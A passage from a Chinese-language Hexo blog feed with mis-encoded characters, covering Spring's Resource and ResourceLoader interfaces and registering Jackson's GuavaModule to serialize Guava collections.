<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol>
<li><a href="http://www.cnblogs.com/fangjian0423/p/springMVC-xml-json-convert.html" rel="external nofollow noopener noreferrer" target="_blank">SpringMVCå…³äºjsonã€xmlè‡ªåŠ¨è½¬æ¢çš„åŸç†ç ”ç©¶(é™„å¸¦æºç åˆ†æ)</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> messageConverter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring-resourceæºç å‰–æ]]></title>
      <url>http://qsli.github.io/2016/11/20/spring-resource/</url>
      <content type="html"><![CDATA[<h1 id="Spring-Resource"><a href="#Spring-Resource" class="headerlink" title="Spring Resource"></a>Spring Resource</h1><h2 id="Why-not-Java-URLç±»"><a href="#Why-not-Java-URLç±»" class="headerlink" title="Why not Java URLç±»"></a>Why not Java URLç±»</h2><p>åŸå› ï¼š å¯¹åº•å±‚èµ„æºçš„æ”¯æŒä¸è¶³ã€‚</p>
<ol>
<li><p>there is no standardized URL implementation that may be used to access a resource that needs to be obtained from the classpath,or relative to a ServletContext.</p>
</li>
<li><p>ä¸è‡ªå®šä¹‰URL handlerçš„åŸå› ï¼š</p>
<p>a. è¿‡äºå¤æ‚<br>b. lack some desirable functionalityï¼ˆå¦‚å¯¹URLæ‰€æŒ‡èµ„æºæ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ï¼‰</p>
</li>
</ol>
<h2 id="Resource-æ¥å£"><a href="#Resource-æ¥å£" class="headerlink" title="Resource æ¥å£"></a>Resource æ¥å£</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InputStreamSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return an &#123;<span class="doctag">@link</span> InputStream&#125;.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;It is expected that each call creates a &lt;i&gt;fresh&lt;/i&gt; stream.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This requirement is particularly important when you consider an API such</span></span><br><span class="line"><span class="comment">	 * as JavaMail, which needs to be able to read the stream multiple times when</span></span><br><span class="line"><span class="comment">	 * creating mail attachments. For such a use case, it is &lt;i&gt;required&lt;/i&gt;</span></span><br><span class="line"><span class="comment">	 * that each &#123;<span class="doctag">@code</span> getInputStream()&#125; call returns a fresh stream.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the input stream for the underlying resource (must not be &#123;<span class="doctag">@code</span> null&#125;)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the stream could not be opened</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.mail.javamail.MimeMessageHelper#addAttachment(String, InputStreamSource)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Resource</span> <span class="keyword">extends</span> <span class="title">InputStreamSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether this resource actually exists in physical form.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This method performs a definitive existence check, whereas the</span></span><br><span class="line"><span class="comment">	 * existence of a &#123;<span class="doctag">@code</span> Resource&#125; handle only guarantees a</span></span><br><span class="line"><span class="comment">	 * valid descriptor handle.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">exists</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether the contents of this resource can be read,</span></span><br><span class="line"><span class="comment">	 * e.g. via &#123;<span class="doctag">@link</span> #getInputStream()&#125; or &#123;<span class="doctag">@link</span> #getFile()&#125;.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will be &#123;<span class="doctag">@code</span> true&#125; for typical resource descriptors;</span></span><br><span class="line"><span class="comment">	 * note that actual content reading may still fail when attempted.</span></span><br><span class="line"><span class="comment">	 * However, a value of &#123;<span class="doctag">@code</span> false&#125; is a definitive indication</span></span><br><span class="line"><span class="comment">	 * that the resource content cannot be read.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #getInputStream()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isReadable</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether this resource represents a handle with an open</span></span><br><span class="line"><span class="comment">	 * stream. If true, the InputStream cannot be read multiple times,</span></span><br><span class="line"><span class="comment">	 * and must be read and closed to avoid resource leaks.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will be &#123;<span class="doctag">@code</span> false&#125; for typical resource descriptors.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isOpen</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a URL handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as URL,</span></span><br><span class="line"><span class="comment">	 * i.e. if the resource is not available as descriptor</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">URL <span class="title">getURL</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a URI handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as URI,</span></span><br><span class="line"><span class="comment">	 * i.e. if the resource is not available as descriptor</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">URI <span class="title">getURI</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a File handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as absolute</span></span><br><span class="line"><span class="comment">	 * file path, i.e. if the resource is not available in a file system</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">File <span class="title">getFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the content length for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved</span></span><br><span class="line"><span class="comment">	 * (in the file system or as some other known physical resource type)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">long</span> <span class="title">contentLength</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the last-modified timestamp for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved</span></span><br><span class="line"><span class="comment">	 * (in the file system or as some other known physical resource type)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">long</span> <span class="title">lastModified</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Create a resource relative to this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> relativePath the relative path (relative to this resource)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resource handle for the relative resource</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the relative resource cannot be determined</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Resource <span class="title">createRelative</span><span class="params">(String relativePath)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine a filename for this resource, i.e. typically the last</span></span><br><span class="line"><span class="comment">	 * part of the path: for example, "myfile.txt".</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Returns &#123;<span class="doctag">@code</span> null&#125; if this type of resource does not</span></span><br><span class="line"><span class="comment">	 * have a filename.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">getFilename</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a description for this resource,</span></span><br><span class="line"><span class="comment">	 * to be used for error output when working with the resource.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Implementations are also encouraged to return this value</span></span><br><span class="line"><span class="comment">	 * from their &#123;<span class="doctag">@code</span> toString&#125; method.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> Object#toString()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç»§æ‰¿ä½“ç³»"><a href="#ç»§æ‰¿ä½“ç³»" class="headerlink" title="ç»§æ‰¿ä½“ç³»"></a>ç»§æ‰¿ä½“ç³»</h3><img src="/2016/11/20/spring-resource/resource.jpg">
<h2 id="ResourceLoader"><a href="#ResourceLoader" class="headerlink" title="ResourceLoader"></a>ResourceLoader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ResourceLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Pseudo URL prefix for loading from the class path: "classpath:" */</span></span><br><span class="line">	String CLASSPATH_URL_PREFIX = ResourceUtils.CLASSPATH_URL_PREFIX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a Resource handle for the specified resource.</span></span><br><span class="line"><span class="comment">	 * The handle should always be a reusable resource descriptor,</span></span><br><span class="line"><span class="comment">	 * allowing for multiple &#123;<span class="doctag">@link</span> Resource#getInputStream()&#125; calls.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;&lt;ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Must support fully qualified URLs, e.g. "file:C:/test.dat".</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Must support classpath pseudo-URLs, e.g. "classpath:test.dat".</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Should support relative file paths, e.g. "WEB-INF/test.dat".</span></span><br><span class="line"><span class="comment">	 * (This will be implementation-specific, typically provided by an</span></span><br><span class="line"><span class="comment">	 * ApplicationContext implementation.)</span></span><br><span class="line"><span class="comment">	 * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Note that a Resource handle does not imply an existing resource;</span></span><br><span class="line"><span class="comment">	 * you need to invoke &#123;<span class="doctag">@link</span> Resource#exists&#125; to check for existence.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> location the resource location</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> a corresponding Resource handle</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #CLASSPATH_URL_PREFIX</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.Resource#exists</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.Resource#getInputStream</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Resource <span class="title">getResource</span><span class="params">(String location)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Expose the ClassLoader used by this ResourceLoader.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Clients which need to access the ClassLoader directly can do so</span></span><br><span class="line"><span class="comment">	 * in a uniform manner with the ResourceLoader, rather than relying</span></span><br><span class="line"><span class="comment">	 * on the thread context ClassLoader.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the ClassLoader (only &#123;<span class="doctag">@code</span> null&#125; if even the system</span></span><br><span class="line"><span class="comment">	 * ClassLoader isn't accessible)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.util.ClassUtils#getDefaultClassLoader()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">ClassLoader <span class="title">getClassLoader</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ResourceLoaderã€€è´Ÿè´£åŠ è½½Resource, æ‰€æœ‰çš„application contextéƒ½å®ç°äº†è¿™ä¸ªæ¥å£ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resource template = ctx.getResource(<span class="string">"some/resource/path/myTemplate.txt"</span>);</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸Šè¿°çš„ctxçš„ç±»å‹æ˜¯ ClassPathXmlApplicationContextï¼Œé‚£ä¹ˆè¿”å›çš„Resourceçš„å…·ä½“ç±»å‹å°±æ˜¯</p>
<p>ClassPathResourceï¼› å¦‚æœctxçš„ç±»å‹æ˜¯FileSystemXmlApplicationContext, è¿”å›çš„ç±»å‹å°±å˜æˆäº†</p>
<p>FileSystemResourceã€‚</p>
<h3 id="æŒ‡å®šè¿”å›çš„Resourceç±»å‹"><a href="#æŒ‡å®šè¿”å›çš„Resourceç±»å‹" class="headerlink" title="æŒ‡å®šè¿”å›çš„Resourceç±»å‹"></a>æŒ‡å®šè¿”å›çš„Resourceç±»å‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resource template = ctx.getResource(<span class="string">"classpath:some/resource/path/myTemplate.txt"</span>);</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ˜¾å¼çš„æŒ‡å®šclasspathå‰ç¼€ï¼Œè¿”å›çš„Resourceçš„å®é™…ç±»å‹å°±æ˜¯ ClassPathResource</p>
<p>å¯¹åº”çš„å…³ç³»è§è¡¨æ ¼ï¼š</p>
<table>
<thead>
<tr>
<th>Prefix</th>
<th>Example</th>
<th>Explanation</th>
</tr>
</thead>
<tbody>
<tr>
<td>classpath:</td>
<td>classpath:com/myapp/config.xml</td>
<td>Loaded from the classpath</td>
</tr>
<tr>
<td>file:</td>
<td>file:///data/config.xml</td>
<td>Loaded as a URL, from the system</td>
</tr>
<tr>
<td>http:</td>
<td><a href="http://myserver/logo.png" rel="external nofollow noopener noreferrer" target="_blank">http://myserver/logo.png</a></td>
<td>Loaded as a URL</td>
</tr>
<tr>
<td>ï¼ˆnoneï¼‰</td>
<td>/data/config.xml</td>
<td>Depends on the underlying ApplicationContext</td>
</tr>
</tbody>
</table>
<h4 id="classpath"><a href="#classpath" class="headerlink" title="classpath*"></a>classpath*</h4><p>classpath*:conf/appContext.xml</p>
<p>è¿™ä¸ªç‰¹æ®Šçš„å‰ç¼€ä¼šä½¿springåœ¨æ‰€æœ‰çš„ClassPathä¸­æŸ¥æ‰¾å’ŒæŒ‡å®šçš„åå­—ç›¸åŒçš„èµ„æºï¼Œä»–ä»¬ä¼šåˆå¹¶å½¢æˆæœ€ç»ˆçš„</p>
<p>ä¸Šä¸‹æ–‡ã€‚</p>
<blockquote>
<p>This special prefix specifies that all classpath resources that match the given name must be obtained<br>(internally, this essentially happens via a ClassLoader.getResources(â€¦) call), and then merged<br>to form the final application context definition.</p>
</blockquote>
<h3 id="ResourceLoaderAware"><a href="#ResourceLoaderAware" class="headerlink" title="ResourceLoaderAware"></a>ResourceLoaderAware</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ResourceLoaderAware</span> <span class="keyword">extends</span> <span class="title">Aware</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Set the ResourceLoader that this object runs in.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This might be a ResourcePatternResolver, which can be checked</span></span><br><span class="line"><span class="comment">	 * through &#123;<span class="doctag">@code</span> instanceof ResourcePatternResolver&#125;. See also the</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@code</span> ResourcePatternUtils.getResourcePatternResolver&#125; method.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Invoked after population of normal bean properties but before an init callback</span></span><br><span class="line"><span class="comment">	 * like InitializingBean's &#123;<span class="doctag">@code</span> afterPropertiesSet&#125; or a custom init-method.</span></span><br><span class="line"><span class="comment">	 * Invoked before ApplicationContextAware's &#123;<span class="doctag">@code</span> setApplicationContext&#125;.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> resourceLoader ResourceLoader object to be used by this object</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.support.ResourcePatternResolver</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.support.ResourcePatternUtils#getResourcePatternResolver</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setResourceLoader</span><span class="params">(ResourceLoader resourceLoader)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®ç°è¿™ä¸ªæ¥å£çš„ç±»ï¼Œå¯ä»¥è·å¾—æ‰€åœ¨å®¹å™¨çš„ResourceLoaderå®ä¾‹ï¼Œä¸€èˆ¬æ¥è¯´å°±æ˜¯ç›¸åº”çš„Application Contextã€‚ä¹Ÿå¯ä»¥å½“åš</p>
<p>ApplicationContextAwareçš„æ›¿ä»£ã€‚</p>
<blockquote>
<p>  Interface to be implemented by any object that wishes to be notified of<br>  the <b>ResourceLoader</b> (typically the ApplicationContext) that it runs in.<br>  This is an alternative to a full ApplicationContext dependency via the<br>  ApplicationContextAware interface.</p>
</blockquote>
<p>é™¤äº†å®ç°ä¸Šè¿°æ¥å£ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åŸºäºç±»å‹çš„æ³¨å…¥ï¼Œå°†ResourceLoaderæ³¨å…¥åˆ°éœ€è¦çš„åœ°æ–¹ã€‚</p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> resource </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jacksonå¯¹guavaæ–°å¢é›†åˆçš„æ”¯æŒ]]></title>
      <url>http://qsli.github.io/2016/11/16/jackson-guava/</url>
      <content type="html"><![CDATA[<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>Guavaä¸­æ–°å¢äº†ä¸å°‘å¥½ç”¨çš„é›†åˆæ¯”å¦‚<code>MultiMap</code>ã€<code>MultiSet</code>ã€<code>Table</code>ç­‰ï¼Œå½“ä½¿ç”¨jacksonè¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™</p>
<p>è¿™äº›é›†åˆå¹¶ä¸èƒ½æ­£ç¡®çš„åºåˆ—åŒ–ï¼Œå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼š</p>
<p>æ­£å¸¸åºåˆ—åŒ–åº”è¯¥ä¸ºï¼š<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"fields"</span>:&#123;</span><br><span class="line">    <span class="attr">"Field1"</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"index"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"header"</span>:<span class="string">"Field1"</span>,</span><br><span class="line">        <span class="attr">"fieldType"</span>:<span class="string">"fieldtype"</span>,</span><br><span class="line">        <span class="attr">"description"</span>:<span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"cleanHeader"</span>:<span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"Field2"</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"index"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"header"</span>:<span class="string">"Field2"</span>,</span><br><span class="line">        <span class="attr">"fieldType"</span>:<span class="string">"fieldtype"</span>,</span><br><span class="line">        <span class="attr">"description"</span>:<span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"cleanHeader"</span>:<span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä½¿ç”¨é»˜è®¤çš„springå‡ºç°çš„æ˜¯ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"fields"</span>:&#123;</span><br><span class="line">    <span class="attr">"empty"</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>è¦è§£å†³è¿™ä¸ªé—®é¢˜å°±è¦æ‰‹åŠ¨å‘jacksonçš„ObjectMapperä¸­æ³¨å†Œä¸€ä¸ªModule</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Table study = getTable();</span><br><span class="line"></span><br><span class="line">ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">mapper.registerModule(<span class="keyword">new</span> GuavaModule());</span><br><span class="line"></span><br><span class="line">String tableString = mapper.writeValueAsString(table);</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ª<code>GuavaModule</code>æ˜¯jacksonå¯¹Guavaé›†åˆæ”¯æŒçš„åŒ…ï¼Œå®ƒçš„mavenä¾èµ–å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.datatype<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-datatype-guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨åŸºäºxmlé…ç½®çš„æ–¹å¼å°†è¿™ä¸ªModuleå¯¼å…¥<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- JSON parser configuration--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"guavaObjectMapper"</span> <span class="attr">class</span>=<span class="string">"com.fasterxml.jackson.databind.ObjectMapper"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.config.MethodInvokingFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetObject"</span>&gt;</span><span class="tag">&lt;<span class="name">ref</span> <span class="attr">local</span>=<span class="string">"guavaObjectMapper"</span> 